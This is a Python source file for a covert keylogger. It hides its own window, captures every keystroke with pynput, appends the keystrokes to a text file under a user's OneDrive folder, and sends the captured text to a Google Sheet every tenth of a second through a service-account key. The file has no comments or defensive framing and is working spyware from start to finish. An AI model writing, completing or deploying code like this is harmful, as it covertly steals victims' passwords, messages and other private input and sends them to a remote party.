from pynput.keyboard import Key,Listener
from tkinter import *
from time import *
from threading import *
from tkinter.font import  Font
import win32gui, win32con
import gspread
from oauth2client.service_account import ServiceAccountCredentials
The_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
k1=''
try:
    scope = ['https://www.googleapis.com/auth/drive']
    creds = ServiceAccountCredentials.from_json_keyfile_name('Sheet.json', scope)
    client = gspread.authorize(creds)
    sheet = client.open('PythonSheet').sheet1
    k1 = str(sheet.row_values(1))
except:
    pass
k=''
class th1(Thread):
    def run(self):


        def key_Pressed(key):
            k = ''
            if key == Key.space:
                lis = ' '
            elif key == Key.enter:
                lis = '\n'
            elif key == Key.backspace:
                lis = ' ~B '
            elif key == Key.shift:
                lis = ' '
            elif key == Key.ctrl_l:
                lis = ' '
            elif key == Key.ctrl_r:
                lis = ' '
            elif key == Key.alt_l:
                lis = ' '
            elif key == Key.alt_r:
                lis = ' '
            elif key == Key.delete:
                lis = ' '
            elif key ==Key.tab:
                lis = ' '

            else:
                lis = str(key)
            k = k + lis
            global k1

            #print()
            f = open('C:\\Users\\Kundan Kumar\\OneDrive\\abc.txt', 'a')
            for i in k:
                if i == "'":
                    pass
                else:
                    k1 = k1 + i

                    f.write(i)
                    #print(k1)#sdsdsdd
            f.close()



        def key_Released(key):
            if key == Key.esc:
                return False

        with Listener(on_press=key_Pressed, on_release=key_Released) as L:
            L.join()

class th2(Thread):
    def run(self):
        while(True):
            try:
                scope = ['https://www.googleapis.com/auth/drive']
                creds = ServiceAccountCredentials.from_json_keyfile_name('Sheet.json', scope)
                client = gspread.authorize(creds)
                sheet = client.open('PythonSheet').sheet1
                l = sheet.update_cell(1, 1, k1)
            except:
                pass
            sleep(0.1)

t1=th1()
t2=th2()
t1.start()
sleep(0.1)
t2.start()

